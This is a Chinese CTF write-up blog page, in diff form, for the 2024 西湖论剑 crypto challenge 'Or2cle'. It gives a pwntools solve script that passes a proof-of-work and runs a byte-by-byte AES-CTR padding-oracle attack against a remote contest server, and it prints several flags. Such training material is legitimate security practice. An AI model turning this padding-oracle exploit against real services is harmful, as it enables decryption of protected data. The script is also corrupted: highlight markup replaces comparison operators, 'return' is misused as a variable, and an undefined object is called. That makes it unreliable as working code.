+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020643.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>恭喜您通过考试！ DASCTF1{3ac9edfef8f89edd768ae839f3488c46}</p>
+<p>DASCTF{93071110885044812621524662463525}</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>‍</p>
+<h3 id="Or2cle"><a href="#Or2cle" class="headerlink" title="Or2cle"></a>Or2cle</h3><p>‍</p>
+<p>‍过proof，跑了几个数据进行搜索</p>
+<p><a target="_blank" rel="noopener" href="https://oeis.org/">https://oeis.org/</a></p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020783.png" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>查询发现，计算a(n)&#x3D;binomial(n,14)即可过proof</p>
+<p>‍</p>
+<p>‍题目是aes ctr模式，padding oracle attack，密文长度是42，</p>
+<p>根据规则可得，原本密文长度为40，2个字节的pad，pad 为b’ \x02’</p>
+<p>‍</p>
+<p>‍</p>
+<p>明文和密文已知的情况下获取密钥，得到密钥之后就可以解密密文得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,bytes_to_long<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256 <br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-comment">#--------------------setting context---------------------</span><br>context.clear(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>li = <span class="hljs-keyword">lambda</span> content,data : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + content + <span class="hljs-string">&#x27; = &#x27;</span> + <span class="hljs-built_in">hex</span>(data) + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>lg = <span class="hljs-keyword">lambda</span> content : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + content +<span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>sla = <span class="hljs-keyword">lambda</span> data, content: io.sendlineafter(data,content)<br>sa = <span class="hljs-keyword">lambda</span> data, content: io.sendafter(data,content)<br>sl = <span class="hljs-keyword">lambda</span> data: io.sendline(data)<br>rl = <span class="hljs-keyword">lambda</span> data: io.recvuntil(data)<br>re = <span class="hljs-keyword">lambda</span> data: io.recv(data)<br>sa = <span class="hljs-keyword">lambda</span> data, content: io.sendafter(data,content)<br>dbg = <span class="hljs-keyword">lambda</span>    : gdb.attach(io)<br>bk = <span class="hljs-keyword">lambda</span> : (dbg(),pause())<br>inter = <span class="hljs-keyword">lambda</span>: io.interactive()<br>l64 = <span class="hljs-keyword">lambda</span>    :u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>h64=<span class="hljs-keyword">lambda</span>     :u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>add=<span class="hljs-number">0</span><br>orw_shellcode = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>) + shellcraft.read(<span class="hljs-number">3</span>, add, <span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>,add, <span class="hljs-number">0x30</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">c = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span>(c):<br>        gdb.attach(io, c)<br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(io)<br>        pause()<br><span class="hljs-comment">#---------------------------------------------------------</span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;/home/ly/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="hljs-comment">#libc=ELF(&quot;/home/ly/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;)</span><br>filename = <span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment">#io = process(filename)</span><br>io =remote(<span class="hljs-string">&quot;1.14.108.193&quot;</span>,<span class="hljs-string">&quot;31132&quot;</span>) <br>elf = ELF(filename)<br><span class="hljs-comment">#---------------------------------------------------------</span><br>strings = <span class="hljs-string">&quot;DASCTF&#123;&#125;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_combination</span>(<span class="hljs-params">n, k</span>):<br>    <span class="hljs-keyword">if</span> k &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> k &gt; n:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> k &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> k &lt;/span&gt; n:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    k = <span class="hljs-built_in">min</span>(k, n - k)<br>    result = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>        result = result * (n - i) // (i + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> result<br>flag = <span class="hljs-string">&quot;&quot;</span> <br>n = u32(rl(<span class="hljs-string">&quot;s : &quot;</span>).strip().split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>])<br>rl(<span class="hljs-string">&quot;hash:&quot;</span>) <br>sl(<span class="hljs-built_in">str</span>(sha256(<span class="hljs-built_in">str</span>(calculate_combination(n+<span class="hljs-number">13</span>, <span class="hljs-number">14</span>)).encode()).hexdigest()))<br><span class="hljs-comment">#过proof</span><br>rl(<span class="hljs-string">b&quot;it\n&quot;</span>) <br>sl(<span class="hljs-string">b&quot;1&quot;</span>) <br>a = rl(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>).decode().split(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>)[<span class="hljs-number">0</span>][-<span class="hljs-number">32</span>:]<br><span class="hljs-comment">#lg(a)</span><br>after64 = b64decode(a) <br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">42</span>): <br>    <span class="hljs-keyword">if</span> index &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-number">16</span> <span class="hljs-keyword">or</span> index &lt;/span&gt; <span class="hljs-number">32</span>: <br>        <span class="hljs-keyword">continue</span> <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings: <br>        rl(<span class="hljs-string">&quot;t\n&quot;</span>) <br>        sl(<span class="hljs-string">b&quot;2&quot;</span>) <br>        tmp_char = <span class="hljs-built_in">chr</span>(after64[index] ^ <span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-number">2</span>)<br>        modified_tmp = after64[:index] + tmp_char.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>) + after64[index+<span class="hljs-number">1</span>:]<br>        sl(modified_tmp) <br>        rl(<span class="hljs-string">&quot;Dec&quot;</span>) <br>        <span class="hljs-keyword">return</span> = sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>).decode().splitlines()[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;faild&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">return</span>: <span class="hljs-comment">#失败就继续</span><br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]&quot;</span>,a)<br>        flag += i <br>        <span class="hljs-keyword">break</span> <br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020001.png" srcset="/img/loading.gif" lazyload alt="image-20240131141132152">​</p>
+<p>得到flag</p>
+<p>DASCTF{771128198258295514986624D2445186}</p>
+<p>d用数字替换</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF - 2024 西湖论剑</div>
+      <div>https://zjackky.github.io/post/ctf-2024-west-lake-discuss-sword-z10dq7t.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zjacky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/java-security-freemarker-template-injection-shallow-analysis-mqvp1.html" title="Java安全 - FreeMarker模版注入浅析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java安全 - FreeMarker模版注入浅析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/target-dark-moon-year-end-shooting-range-z1krwjl.html" title="打靶 - 暗月年终靶场">
+                        <span class="hidden-mobile">打靶 - 暗月年终靶场</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Zjackky/Zjackky.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Zjackky/Zjackky.github.io" target="_blank" rel="nofollow noopener"><span>My Github</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
